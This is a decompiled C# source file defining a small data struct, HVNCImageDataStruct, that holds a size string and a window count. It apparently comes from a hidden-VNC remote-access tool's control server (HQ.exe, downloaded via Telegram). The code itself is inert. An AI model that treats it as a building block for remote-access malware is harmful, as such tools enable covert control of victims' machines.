// Decompiled with JetBrains decompiler
// Type: InvokedServer.DataStructs.HVNCImageDataStruct
// Assembly: HQ, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C53BC0E5-A85B-41E9-8105-FC74ED122A9A
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\HQ.exe


namespace InvokedServer.DataStructs
{
	public struct HVNCImageDataStruct
	{
		public string sizeText;
		public int windowCount;

		public HVNCImageDataStruct(string _sizeText, int _windowCount)
		{
			this.sizeText = _sizeText;
			this.windowCount = _windowCount;
		}
	}
}